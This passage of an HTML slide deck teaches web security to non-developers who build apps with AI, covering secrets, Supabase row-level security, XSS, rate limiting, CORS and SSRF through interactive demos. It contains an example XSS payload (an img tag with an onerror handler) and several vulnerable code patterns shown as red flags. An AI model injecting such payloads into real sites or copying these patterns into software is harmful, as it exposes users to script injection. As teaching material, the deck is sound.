  font-family: var(--font-mono);
  font-size: 0.8rem;
  color: var(--text);
}

.security-warning {
  margin-top: 0.5rem;
  padding: 0.75rem;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid #ef4444;
  border-radius: 0.375rem;
  color: #ef4444;
  font-size: 0.85rem;
  font-weight: 500;
}

/* Table row visual feedback */
.accessible {
  background: rgba(34, 197, 94, 0.1);
}

.blocked {
  background: rgba(156, 163, 175, 0.3);
  opacity: 0.6;
}

.own-record {
  background: rgba(34, 197, 94, 0.1);
}

.exposed-record {
  background: rgba(239, 68, 68, 0.1);
  animation: pulse-warning 2s infinite;
}

@keyframes pulse-warning {
  0%, 100% { background: rgba(239, 68, 68, 0.1); }
  50% { background: rgba(239, 68, 68, 0.2); }
}

.rls-result, .log-entry, .ssrf-result { 
  padding: 0.75rem; 
  margin: 0.5rem 0; 
  border-radius: 0.375rem; 
  border-left: 3px solid;
}

/* Semantic result styling with icons and labels */
.success { 
  border-left-color: var(--accent-success); 
  background: rgba(16, 185, 129, 0.08); 
}
.success::before {
  content: '‚úì SUCCESS: ';
  font-weight: 700;
  color: var(--accent-success);
}
.error { 
  border-left-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.08); 
}
.error::before {
  content: '‚úñ ERROR: ';
  font-weight: 700;
  color: var(--accent-danger);
}
.warning { 
  border-left-color: var(--accent-warning); 
  background: rgba(245, 158, 11, 0.08); 
}
.warning::before {
  content: '‚ö† WARNING: ';
  font-weight: 700;
  color: var(--accent-warning);
}
.info { 
  border-left-color: #0ea5e9; 
  background: rgba(14, 165, 233, 0.08); 
}
.info::before {
  content: 'üìù INFO: ';
  font-weight: 700;
  color: #0ea5e9;
}

/* XSS Demo specific */
.demo-inputs, .demo-output { 
  margin: 1rem 0; 
}
.demo-buttons { 
  display: flex; 
  gap: 0.75rem; 
  margin-top: 1rem; 
  flex-wrap: wrap; 
  align-items: center;
}
/* Legacy button overrides - handled by unified styling above */

.xss-output { 
  padding: 1rem; 
  border: 1px solid var(--border); 
  border-radius: 6px; 
  min-height: 3rem; 
  margin-top: 1rem; 
  font-family: ui-monospace, monospace;
  font-size: 0.9rem;
  position: relative;
}
.xss-output.insecure { 
  border-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.05); 
  border-left: 4px solid var(--accent-danger);
}
.xss-output.insecure::before {
  content: 'üö® INSECURE RENDERING';
  position: absolute;
  top: -0.75rem;
  left: 1rem;
  background: var(--bg);
  padding: 0.25rem 0.5rem;
  font-size: 0.75rem;
  font-weight: 700;
  color: var(--accent-danger);
  border-radius: 4px;
  border: 1px solid var(--accent-danger);
}
.xss-output.secure { 
  border-color: var(--accent-success); 
  background: rgba(16, 185, 129, 0.05); 
  border-left: 4px solid var(--accent-success);
}
.xss-output.secure::before {
  content: '‚úì SECURE RENDERING';
  position: absolute;
  top: -0.75rem;
  left: 1rem;
  background: var(--bg);
  padding: 0.25rem 0.5rem;
  font-size: 0.75rem;
  font-weight: 700;
  color: var(--accent-success);
  border-radius: 4px;
  border: 1px solid var(--accent-success);
}

.xss-samples, .ssrf-samples { 
  margin-top: 1rem; 
  font-size: 0.9rem; 
}
.sample-buttons { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-top: 0.5rem; 
}
.sample-buttons button { 
  padding: 0.375rem 0.75rem; 
  font-size: 0.8rem; 
  min-width: auto;
  min-height: auto;
}

/* Rate limit demo styling */
.limit-controls { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-bottom: 1rem; 
}
.limit-controls button { 
  padding: 0.5rem 1rem; 
  font-size: 0.85rem;
}

/* Unified input styling across all demos */
input[type="text"], input[type="url"], input[type="email"], textarea, select {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid var(--border);
  border-radius: 6px;
  font-family: inherit;
  font-size: 0.9rem;
  background: var(--bg);
  color: var(--text);
  transition: all 0.2s ease;
  box-sizing: border-box;
}
input:focus, textarea:focus, select:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(var(--accent-rgb), 0.1);
}
textarea {
  font-family: ui-monospace, monospace;
  resize: vertical;
  min-height: 120px;
}
.findings { 
  margin-top: 1rem; 
}
.finding { 
  padding: 0.75rem; 
  margin: 0.5rem 0; 
  border-radius: 0.375rem; 
  border-left: 3px solid; 
}
.finding.high { 
  border-left-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.08); 
}
.finding.high::before {
  content: 'üî¥ HIGH RISK: ';
  font-weight: 700;
  color: var(--accent-danger);
}
.finding.medium { 
  border-left-color: var(--accent-warning); 
  background: rgba(245, 158, 11, 0.08); 
}
.finding.medium::before {
  content: 'üü° MEDIUM RISK: ';
  font-weight: 700;
  color: var(--accent-warning);
}
.finding.low { 
  border-left-color: #6b7280; 
  background: rgba(107, 114, 128, 0.08); 
}
.finding.low::before {
  content: '‚ö™ LOW RISK: ';
  font-weight: 700;
  color: #6b7280;
}

/* File upload styling */
input[type="file"] { 
  margin-bottom: 1rem; 
  padding: 0.5rem; 
  border: 2px dashed var(--border); 
  border-radius: 6px; 
  background: var(--bg-elev);
  cursor: pointer;
  transition: all 0.2s ease;
}
input[type="file"]:hover {
  border-color: var(--accent);
  background: rgba(var(--accent-rgb), 0.05);
}
.upload-status { 
  margin: 0.5rem 0; 
}
.validation-summary { 
  padding: 0.75rem; 
  border-radius: 0.375rem; 
  font-weight: 600; 
  margin-bottom: 1rem; 
}
.validation-details { }
.validation-item { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  border-radius: 0.25rem; 
  font-size: 0.9rem; 
}
.validation-item.pass { 
  background: rgba(16, 185, 129, 0.08); 
  border-left: 3px solid var(--accent-success);
}
.validation-item.pass::before {
  content: '‚úì PASS: ';
  font-weight: 700;
  color: var(--accent-success);
}
.validation-item.fail { 
  background: rgba(239, 68, 68, 0.08); 
  border-left: 3px solid var(--accent-danger);
}
.validation-item.fail::before {
  content: '‚úñ FAIL: ';
  font-weight: 700;
  color: var(--accent-danger);
}

/* Input groups and labels */
.input-group {
  margin: 1rem 0;
}
.input-group label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 600;
  color: var(--text);
  font-size: 0.9rem;
}
.input-group input, .input-group textarea, .input-group select {
  margin-bottom: 0.5rem;
}

/* Headers demo styling */
.headers-list { }
.header-item { 
  margin: 0.75rem 0; 
  padding: 0.75rem; 
  background: var(--bg-elev); 
  border: 1px solid var(--border); 
  border-radius: 0.375rem; 
}
.header-item strong { 
  color: var(--accent); 
}
.header-item code { 
  display: block; 
  margin-top: 0.25rem; 
  font-size: 0.85rem; 
}

/* Test output styling */
.test-step { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  background: var(--bg-elev); 
  border-radius: 0.25rem; 
}
.test-results { 
  margin-top: 1rem; 
  padding: 1rem; 
  border-radius: 0.5rem; 
}
.test-results.pass { 
  background: rgba(16, 185, 129, 0.08); 
  border: 1px solid var(--accent-success); 
  border-left: 4px solid var(--accent-success);
}
.test-results.pass::before {
  content: '‚úì TEST PASSED';
  display: block;
  font-weight: 700;
  color: var(--accent-success);
  margin-bottom: 0.5rem;
  font-size: 0.9rem;
}
.test-results.fail { 
  background: rgba(239, 68, 68, 0.08); 
  border: 1px solid var(--accent-danger); 
  border-left: 4px solid var(--accent-danger);
}
.test-results.fail::before {
  content: '‚úñ TEST FAILED';
  display: block;
  font-weight: 700;
  color: var(--accent-danger);
  margin-bottom: 0.5rem;
  font-size: 0.9rem;
}
.result-item { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  border-radius: 0.25rem; 
}
.conclusion { 
  font-weight: 600; 
  margin-top: 1rem; 
  padding: 0.75rem; 
  border-radius: 0.375rem; 
}

.loading { 
  text-align: center; 
  color: var(--muted); 
  font-style: italic; 
}

.security-note { 
  color: #22c55e; 
  font-weight: 500; 
  margin-top: 0.5rem; 
}
.security-warning { 
  color: #ef4444; 
  font-weight: 500; 
  margin-top: 0.5rem; 
}

/* Secrets Demo - Grid Layout */
.secrets-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 0.3rem;
  margin: 0.2rem 0;
}

.secret-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 0.35rem;
  cursor: pointer;
  transition: all 0.2s ease;
  position: relative;
  overflow: hidden;
  min-height: 2.2rem;
}

.secret-card:hover {
  border-color: var(--accent);
  background: var(--bg-hover);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.secret-card.selected {
  border-color: var(--accent);
  background: var(--bg-hover);
  box-shadow: 0 0 0 2px rgba(var(--accent-rgb), 0.2);
}

.secret-type {
  font-weight: 600;
  font-size: 0.75rem;
  color: var(--text);
  margin-bottom: 0.2rem;
  line-height: 1.2;
}

.secret-preview {
  font-family: var(--font-mono);
  font-size: 0.6rem;
  color: var(--muted);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.secret-info {
  margin-top: 0.4rem;
}

.secret-details {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 0.5rem;
  border-left: 4px solid var(--border);
}

.secret-details.success {
  border-left-color: #22c55e;
  background: rgba(34, 197, 94, 0.05);
}

.secret-details.error {
  border-left-color: #ef4444;
  background: rgba(239, 68, 68, 0.05);
}

.secret-details.warning {
  border-left-color: #f59e0b;
  background: rgba(245, 158, 11, 0.05);
}

.secret-details h4 {
  margin: 0 0 0.5rem 0;
  color: var(--text);
  font-size: 1rem;
}

.secret-details .location {
  font-weight: 600;
  margin-bottom: 0.75rem;
  font-size: 0.9rem;
}

.secret-details.success .location {
  color: #22c55e;
}

.secret-details.error .location {
  color: #ef4444;
}

.secret-details.warning .location {
  color: #f59e0b;
}

.secret-details p {
  margin: 0 0 1rem 0;
  color: var(--text);
  line-height: 1.4;
}

.secret-details .example {
  background: var(--bg-subtle);
  border-radius: 4px;
  padding: 0.4rem;
  margin-top: 0.4rem;
}

.secret-details .example strong {
  color: var(--muted);
  font-size: 0.75rem;
  display: block;
  margin-bottom: 0.3rem;
}

.secret-details .example code {
  font-family: var(--font-mono);
  font-size: 0.7rem;
  color: var(--text);
  word-break: break-all;
  display: block;
}

/* Small screens - demo responsive */
@media (max-width: 700px) { 
  .user-tabs { 
    flex-wrap: wrap; 
  }
  .test-actions { 
    justify-content: center; 
  }
  .limit-controls { 
    justify-content: center; 
  }
  .secrets-grid {
    grid-template-columns: repeat(2, 1fr);
    gap: 0.3rem;
  }
  .secret-card {
    padding: 0.4rem;
  }
}
    </style>
  </head>
  <body>

    <main id="content">
      <section class="slide" id="intro" data-color="blue" tabindex="-1">
  <h1>How To Vibe Secure</h1>
  <p class="subtitle">Fast, Practical Playbook</p>
  <ul class="lead">
    <li><strong>Audience:</strong> non‚Äëdev builders using AI to ship fast</li>
    <li><strong>Goal:</strong> ship things that would be resilient on the internet</li>
  </ul>
  <div class="about-author">
    <p>Vibe coded by <strong><a href="https://x.com/hankyone" target="_blank" rel="noopener noreferrer">@hankyone</a></strong> ‚Äî <a href="https://www.linkedin.com/in/anouarmansour/" target="_blank" rel="noopener noreferrer">LinkedIn</a></p>
    <div class="author-background">
      <p>Offensive Security @ Microsoft</p>
      <p>Penetration Tester @ Government of Ontario</p>
      <p>Senior Consultant in Threat and Vulnerability @ Deloitte</p>
      <p>Cyber Operator, Reconnaissance @ Canadian Forces, DND</p>
    </div>
  </div>
</section>
<section class="slide" id="mindset" data-color="red" tabindex="-1">
  <h2>Security Mindset: Adversarial Thinking</h2>
  
  <div class="lead-question">
    <h3>Before you build or implement a feature, ask:</h3>
    <div class="big-question">"What would a malicious user be able to do?"</div>
  </div>

  <div class="one-prompt-away">
    <h3>ü§ñ You're just one prompt away from security</h3>
    <ul class="ai-prompts">
      <li><strong>Don't understand the feature?</strong> ‚Üí Ask AI to explain it</li>
      <li><strong>Not sure if it's secure?</strong> ‚Üí Ask "Why is this secure?"</li>
      <li><strong>Push back on the AI</strong> ‚Üí "What could go wrong with this approach?"</li>
    </ul>
  </div>

  <div class="adversarial-questions">
    <h3>‚ö° Security Questions for Vibe Coders</h3>
    <ul class="question-list">
      <li>What bad data could users submit?</li>
      <li>Who should NOT access this data?</li>
      <li>What happens if this gets spammed?</li>
      <li>What secrets am I accidentally exposing?</li>
      <li>Where could users bypass my checks?</li>
      <li>How do I prompt AI for secure code?</li>
    </ul>
  </div>
</section>
<section class="slide" id="frontend-backend" data-color="violet" tabindex="-1">
  <h2>Frontend vs Backend: UX vs Security</h2>
  <div class="comparison">
    <div class="frontend-side">
      <h3>Frontend = UX</h3>
      <p>Assume attackers can change anything in the browser</p>
    </div>
    <div class="backend-side">
      <h3>Backend = Authority</h3>
      <p>Enforce all checks server/DB-side</p>
    </div>
  </div>
  <div id="frontendBackendDemo" class="demo">
    <h4>Demo: DevTools Button Bypass</h4>
    <div class="demo-controls">
      <button id="checkoutBtn" disabled>üí≥ Checkout ($99.99)</button>
      <p class="demo-status">Button is disabled in UI. Try enabling it with DevTools!</p>
    </div>
  </div>
  <details class="notes">
    <summary>Examples</summary>
    <ul>
      <li>Disabled button ‚Üí DevTools removes <code>disabled</code> ‚Üí request still hits server</li>
      <li>Hidden price field ‚Üí user edits price client-side ‚Üí server must compute price from DB</li>
      <li>Read-only role selector ‚Üí user flips to <code>admin</code> ‚Üí server ignores and uses server-side role</li>
    </ul>
  </details>
</section>
<section class="slide" id="ai-prompts" data-color="indigo" tabindex="-1">
  <h2>How to Talk to Your AI</h2>
  
  <div class="context-first">
    <h3>üéØ Give Context First</h3>
    <p><strong>Ramble!</strong> Start with what you want to build, then keep talking about your security concerns. The more you share your worries, the better security advice you get.</p>
    <div class="example-context">
      <em>"I need a recipe sharing feature where users can upload photos and recipes. Actually, I'm using Supabase for the backend. Oh wait, I'm worried about people uploading malware disguised as images. Also, what if users can see other people's private recipes? And what if someone spams the upload endpoint? I'm not sure how to handle file validation either..."</em>
    </div>
  </div>

  <div class="prompt-template">
    <h3>‚úÖ Then ask for these 4 things:</h3>
    <ul class="security-criteria">
      <li><strong>Input checking:</strong> What could users send that would break things?</li>
      <li><strong>Who sees what:</strong> How do I make sure users only see their own stuff?</li>
      <li><strong>Spam protection:</strong> How do I stop someone from spamming my app?</li>
      <li><strong>Quick test:</strong> Give me a way to verify these protections actually work</li>
    </ul>
  </div>
  
  <div class="one-liner">
    <strong>Copy-paste starter for production security:</strong><br>
    <em>"Before this goes live: Are all routes properly authenticated? Can users only access their own data? Are there rate limits to prevent spam and abuse? How do I verify that unauthorized users get rejected with proper error codes? Walk me through testing these security controls step by step."</em>
  </div>
</section>
<section class="slide" id="secrets" data-color="orange" tabindex="-1">
  <h2>Secrets Management</h2>
  <div class="assistant-brief">
    <h3>Secrets Inventory Prompt</h3>
    <div class="prompt-box">
      <p>"List all secrets in this app. For each secret: 1) What is it used for? 2) Where is it stored? 3) Is it public or private? 4) Does it have correct prefix? Make sure no secrets are exposed accidentally."</p>
    </div>
  </div>
  <div class="env-vars-info">
    <h3>üí° Key Rule</h3>
    <p><strong>All secrets go in environment variables</strong> (.env files locally, platform env vars in production). Never hardcode secrets in your code.</p>
  </div>
  <div class="verify-section">
    <h3>Quick Check</h3>
    <ul class="checklist">
      <li>‚úÖ .env file exists with all secrets</li>
      <li>‚úÖ VITE_ prefix only on public keys</li>
      <li>‚úÖ No hardcoded strings that look like keys</li>
    </ul>
  </div>
  <div id="secretsDemo" class="demo">
    <h4>üîë Where Do These Secrets Belong?</h4>
    <p>Click each secret type to see where it should live:</p>
    <div class="secrets-grid">
      <div class="secret-card" onclick="showSecretInfo('supabase-public')" data-secret="supabase-public">
        <div class="secret-type">Supabase Anon</div>
        <div class="secret-preview">eyJh...VCJ9</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('supabase-service')" data-secret="supabase-service">
        <div class="secret-type">Supabase Service</div>
        <div class="secret-preview">eyJh...VCJ9</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('stripe-public')" data-secret="stripe-public">
        <div class="secret-type">Stripe Public</div>
        <div class="secret-preview">pk_test_51H...</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('stripe-secret')" data-secret="stripe-secret">
        <div class="secret-type">Stripe Secret</div>
        <div class="secret-preview">sk_test_51H...</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('google-maps')" data-secret="google-maps">
        <div class="secret-type">Google Maps</div>
        <div class="secret-preview">AIza...WK</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('jwt-secret')" data-secret="jwt-secret">
        <div class="secret-type">JWT Secret</div>
        <div class="secret-preview">your-256-bit...</div>
      </div>
    </div>
    <div class="secret-info"></div>
  </div>
</section>
<section class="slide" id="rls" data-color="teal" tabindex="-1">
  <h2>Data Access (Supabase RLS Made Simple)</h2>
  
  <div class="rls-layout">
    <div class="rls-content">
      <div class="mental-model">
        <h3>Mental Model</h3>
        <p><strong>"Who can see/change what"</strong> lives in DB policies. Turn <span class="highlight">RLS on</span> for all tables in Supabase.</p>
      </div>
      
      <div class="what-is-rls">
        <h3>What are RLS Policies?</h3>
        <p>Row Level Security (RLS) policies are SQL rules that automatically filter database rows based on the current user. They run <em>inside the database</em>, making them impossible to bypass from the frontend.</p>
      </div>
      
      <div class="assistant-brief">
        <h3>AI Prompt for RLS Setup</h3>
        <div class="prompt-box">
          <p>"Review my Supabase database and create RLS policies for all tables. For each table, create user-owns-row policies and show me the SQL. Test with users A/B to verify B cannot access A's data."</p>
        </div>
        <p class="tip">üí° <strong>Use the Supabase MCP</strong> - gives AI coding tools direct access to review and manage your RLS policies</p>
      </div>
    </div>
    
    <div class="rls-demo">
      <div id="rlsDemo" class="demo">
        <h4>üîí RLS Database Demo</h4>
        
        <div class="data-creation">
          <h5>Add Data to Database</h5>
          <div class="create-controls">
            <select id="dataOwner">
              <option value="User A">User A</option>
              <option value="User B">User B</option>
            </select>
            <input type="text" id="dataInput" placeholder="Enter some data..." />
            <button onclick="addDatabaseRecord()">Add Record</button>
          </div>
        </div>
        
        <div class="database-table">
          <h5>üìä Database Table: "notes"</h5>
          <table id="databaseTable">
            <thead>
              <tr>
                <th>ID</th>
                <th>Owner</th>
                <th>Data</th>
                <th>Created</th>
              </tr>
            </thead>
            <tbody id="tableBody">
              <!-- Database records will appear here -->
            </tbody>
          </table>
        </div>
        
        <div class="query-controls">
          <h5>üîç Run Query</h5>
          <div class="query-settings">
            <div class="current-user">
              <label>Current User:</label>
              <select id="currentUser">
                <option value="User A">User A</option>
                <option value="User B">User B</option>
              </select>
            </div>
            <div class="rls-toggle">
              <label>
                <input type="checkbox" id="rlsEnabled" checked>
                RLS Protection ON
              </label>
            </div>
            <button onclick="runQuery()" class="query-btn">SELECT * FROM notes</button>
          </div>
        </div>
        
        <div class="query-results">
          <h5 id="resultsTitle">Query Results</h5>
          <div id="sqlDisplay" class="sql-display"></div>
          <table id="resultsTable">
            <thead>
              <tr>
                <th>ID</th>
                <th>Owner</th>
                <th>Data</th>
                <th>Created</th>
              </tr>
            </thead>
            <tbody id="resultsBody">
              <!-- Query results will appear here -->
            </tbody>
          </table>
          <div id="securityWarning" class="security-warning" style="display: none;"></div>
        </div>
        
        <div class="demo-controls">
          <button onclick="resetDatabase()" class="reset-btn">Reset Database</button>
        </div>
      </div>
    </div>
  </div>
</section>
<section class="slide" id="xss-demo" data-color="violet" tabindex="-1">
  <h2>Input Validation & XSS</h2>
  <p>Keep it simple: expect exact types/lengths/formats. Never trust user input.</p>
  <div id="xssMount" class="demo">
    <h4>XSS Protection Demo</h4>
    <div class="demo-inputs">
      <label for="xssInput"><strong>Try some HTML/JS</strong></label>
      <textarea id="xssInput" rows="4" placeholder="Try: &lt;img src=x onerror=alert('XSS!')&gt;"></textarea>
      <div class="demo-buttons">
        <button id="btnInsecure" class="danger-btn">Render (insecure)</button>
        <button id="btnSecure" class="safe-btn">Render (escaped)</button>
        <button id="btnClear">Clear</button>
      </div>
    </div>
    <div class="demo-output">
      <strong>Output</strong>
      <div id="xssOut"></div>
    </div>
  </div>
  <details class="notes">
    <summary>Speaker notes</summary>
    <ul>
      <li>Show an <code>&lt;img onerror&gt;</code> payload executing in the insecure path</li>
      <li>Toggle to the secure path to see proper escaping</li>
      <li>Highlight CSP and DOMPurify as production options</li>
    </ul>
  </details>
</section>
<section class="slide" id="api-limits" data-color="blue" tabindex="-1">
  <h2>API Surface & Rate Limiting</h2>
  <div class="key-concepts">
    <h3>Global limits + quotas for everything</h3>
    <ul>
      <li>Per-IP limits (prevent DDoS)</li>
      <li>Per-user limits (prevent abuse)</li>
      <li>Per-key limits (API quotas)</li>
      <li>Costly operations get lower limits</li>
    </ul>
  </div>
  <div id="rateLimitDemo" class="demo">
    <h4>Rate Limit Demo</h4>
    <div class="limit-controls">
      <button onclick="makeRequest()">Make API Request</button>
      <button onclick="floodRequests()">Flood Requests (10x)</button>
      <button onclick="resetLimits()">Reset Limits</button>
    </div>
    <div class="request-log"></div>
  </div>
</section>
<section class="slide" id="cors-headers" data-color="orange" tabindex="-1">
  <h2>CORS & Headers</h2>
  <div class="what-not-to-do">
    <h3>‚ùå What NOT to do</h3>
    <ul class="dont-list">
      <li><code>Access-Control-Allow-Origin: *</code> with credentials - allows any origin to access sensitive data</li>
      <li>Missing CSP headers - no protection against XSS and code injection</li>
      <li>No HSTS on production - traffic can be downgraded to insecure HTTP</li>
      <li>Allowing inline scripts without nonces - makes XSS attacks trivial</li>
    </ul>
  </div>
  
  <div class="security-headers-guide">
    <h3>üõ°Ô∏è Essential Security Headers</h3>
    <ul>
      <li><strong>CSP</strong>: Content Security Policy blocks XSS attacks</li>
      <li><strong>HSTS</strong>: HTTP Strict Transport Security enforces HTTPS</li>
      <li><strong>X-Frame-Options</strong>: Prevents clickjacking via iframes</li>
      <li><strong>CORS</strong>: Cross-Origin Resource Sharing controls API access</li>
    </ul>
  </div>
  <div class="assistant-brief">
    <h3>‚úÖ Ask AI to analyze & configure</h3>
    <div class="prompt-box">
      <p>"Analyze our current security headers and show me which ones we have set vs missing. For each header (CSP, HSTS, X-Frame-Options, CORS), explain the security implications and provide production-ready configurations that work with our current assets. Include nonces/hashes for CSP and exact origins for CORS."</p>
    </div>
  </div>
  <div id="headersDemo" class="demo">
    <h4>Headers Inspector</h4>
    <button onclick="checkHeaders()">Check Current Headers</button>
    <div class="headers-output"></div>
  </div>
</section>
<section class="slide" id="storage" data-color="indigo" tabindex="-1">
  <h2>Storage & File Uploads</h2>
  <div class="storage-rules">
    <h3>Rules</h3>
    <ul>
      <li>Private buckets by default</li>
      <li>Signed URLs for access</li>
      <li>MIME/size caps strictly enforced</li>
      <li>Virus scanning for user uploads</li>
      <li>Never serve files directly from app server</li>
    </ul>
  </div>
  <div id="uploadDemo" class="demo">
    <h4>Upload Validation Demo</h4>
    <input type="file" id="fileInput" />
    <div class="upload-status"></div>
    <div class="validation-results"></div>
  </div>
</section>
<section class="slide" id="server-calls" data-color="teal" tabindex="-1">
  <h2>Server‚ÄëSide API Calls</h2>
  <div class="key-rules">
    <h3>Never ship keys; validate responses</h3>
    <ul>
      <li>All API keys stay server-side only</li>
      <li>Validate LLM responses against schema</li>
      <li>Rate limit outbound calls</li>
      <li>Allowlist outbound destinations (prevent SSRF)</li>
    </ul>
  </div>
  <div id="ssrfDemo" class="demo">
    <h4>SSRF Protection Demo</h4>
    <input type="url" placeholder="Enter URL to fetch..." />
    <button onclick="testSSRF(this)">Test Fetch</button>
    <div class="ssrf-results"></div>
  </div>
</section>
<section class="slide" id="vuln-classes" data-color="red" tabindex="-1">
  <h2>Lightning Round: Vulnerability Classes</h2>
  <div class="vuln-grid">
    <div class="vuln-card">
      <h4>Injection</h4>
      <p><strong>Model:</strong> untrusted input becomes code</p>
      <p><strong>Do:</strong> parameterized queries, no string concat</p>
      <p><strong>Red flag:</strong> <code>WHERE id = ${req.query.id}</code></p>
    </div>
    <div class="vuln-card">
      <h4>XSS</h4>
      <p><strong>Model:</strong> untrusted data renders as HTML/JS</p>
      <p><strong>Do:</strong> auto-escape templates, CSP</p>
      <p><strong>Red flag:</strong> <code>dangerouslySetInnerHTML</code></p>
    </div>
    <div class="vuln-card">
      <h4>SSRF</h4>
      <p><strong>Model:</strong> server fetches attacker URLs</p>
      <p><strong>Do:</strong> outbound allowlist, block private IPs</p>
      <p><strong>Red flag:</strong> arbitrary URL fetchers</p>
    </div>
    <div class="vuln-card">
      <h4>IDOR/BOLA</h4>
      <p><strong>Model:</strong> users access objects they don't own</p>
      <p><strong>Do:</strong> enforce ownership in DB (RLS)</p>
      <p><strong>Red flag:</strong> only "is logged in" check</p>
    </div>
    <div class="vuln-card">
      <h4>Mass Assignment</h4>
      <p><strong>Model:</strong> user sets unintended fields</p>
      <p><strong>Do:</strong> whitelist updateable fields</p>
      <p><strong>Red flag:</strong> <code>update(model, req.body)</code></p>
    </div>
    <div class="vuln-card">
      <h4>File Uploads</h4>
      <p><strong>Model:</strong> files as malware/bombs</p>
      <p><strong>Do:</strong> MIME limits, object storage, scan</p>
      <p><strong>Red flag:</strong> serving uploads from app server</p>
    </div>
  </div>
</section>
<section class="slide" id="keep-current" data-color="green" tabindex="-1">
  <h2>Keep It Current</h2>
  <div class="assistant-brief">
    <h3>Assistant Prompt</h3>
    <div class="prompt-box">
      <p>"Upgrade to latest LTS/runtime and safe minor versions of all dependencies. Replace deprecated packages. Generate a PR with: 1) changelog diff of breaking changes, 2) snapshot tests updated, 3) a smoke‚Äëtest script that hits key routes, 4) <code>npm audit</code> output showing no critical vulns. Schedule weekly automated update PRs."</p>
    </div>
  </div>
  <div class="verify-section">
    <h3>Verify</h3>
    <ul class="checklist">
      <li>‚úÖ App boots</li>
      <li>‚úÖ Smoke tests pass</li>
      <li>‚úÖ Audit shows 0 high/critical</li>
    </ul>
  </div>
</section>
<section class="slide" id="rls-testing" data-color="violet" tabindex="-1">
  <h2>RLS Testing in 3 Steps</h2>
  <div class="testing-steps">
    <div class="step">
      <h3>1. Create Test Users</h3>
      <p>Create two test users (A/B) and sign in to get user tokens</p>
    </div>
    <div class="step">
      <h3>2. Test User A</h3>
      <p>With <strong>user A</strong> token, try: read/write A rows, read/write B rows (should fail)</p>
    </div>
    <div class="step">
      <h3>3. Test User B</h3>
      <p>With <strong>user B</strong> token, repeat. Log denials; fix policies until only intended access works</p>
    </div>
  </div>
  <div id="rlsTestDemo" class="demo">
    <h4>Quick RLS Test</h4>
    <button onclick="runRLSTest()">Run 3-Step Test</button>
    <div class="test-output"></div>
  </div>
</section>
<section class="slide" id="checklist" data-color="blue" tabindex="-1">
  <h2>10‚ÄëMinute Hardening Checklist</h2>
  <div class="checklist-grid">
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Secret-scan repo/build; rotate if exposed</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Enable email‚Äëverified sign‚Äëups; disable anonymous</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span><strong>RLS on</strong> for all tables; write explicit policies</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Rate‚Äëlimit auth and all write endpoints</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Add bot gate on signup/reset (Turnstile/hCaptcha)</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>CORS: exact origins; credentials only if needed</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>CSP policy; disable inline scripts or use nonces</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>File uploads: MIME/size limits; signed URLs</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Egress allowlist for server fetch of user URLs</span>
    </label>
    <label class="checklist-item">
      <input type="checkbox" />
      <span>Configure basic alerts (5xx, auth failures, rate limits)</span>
    </label>
  </div>
</section>
<section class="slide" id="resources" data-color="indigo" tabindex="-1">
  <h2>Resources & Next Steps</h2>
  <div class="resources-grid">
    <div class="resource-section">
      <h3>Learn More</h3>
      <ul>
        <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a></li>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank" rel="noopener noreferrer">MDN Web Security</a></li>
        <li><a href="https://supabase.com/docs/guides/auth/row-level-security" target="_blank" rel="noopener noreferrer">Supabase RLS Docs</a></li>
      </ul>
    </div>
    <div class="resource-section">
      <h3>Copy‚ÄëPaste Prompts</h3>
      <div class="prompt-examples">
        <div class="prompt-example">
          <strong>Security Review:</strong>
          <code>"Audit this repository for: secrets, auth, RLS, rate limiting, CORS, CSP, file uploads. Return exact file changes."</code>
        </div>
        <div class="prompt-example">
          <strong>Endpoint Guards:</strong>
          <code>"Add schema validation, rate limiting, ownership checks, and helpful 4xx errors to this route."</code>
        </div>
      </div>
    </div>
  </div>
  <p class="footnote">Built as a single static page. No build step required. ‚ú®</p>
</section>

    </main>

    <!-- Slide indicator -->
    <div id="slideIndicator" class="slide-indicator">
      <span id="currentSlide">1</span>/<span id="totalSlides">16</span>
    </div>

    <!-- Table of Contents -->
    <div id="tableOfContents" class="table-of-contents">
      <div class="toc-header">Table of Contents</div>
      <div class="toc-content">
        <div class="toc-item" data-slide="intro">
          <span class="toc-number">1</span>
          <span class="toc-title">How To Vibe Secure</span>
        </div>
        <div class="toc-item" data-slide="mindset">
          <span class="toc-number">2</span>
          <span class="toc-title">Mindset: Default‚ÄëDeny</span>
        </div>
        <div class="toc-item" data-slide="frontend-backend">
          <span class="toc-number">3</span>
          <span class="toc-title">Frontend vs Backend</span>
        </div>
        <div class="toc-item" data-slide="ai-prompts">
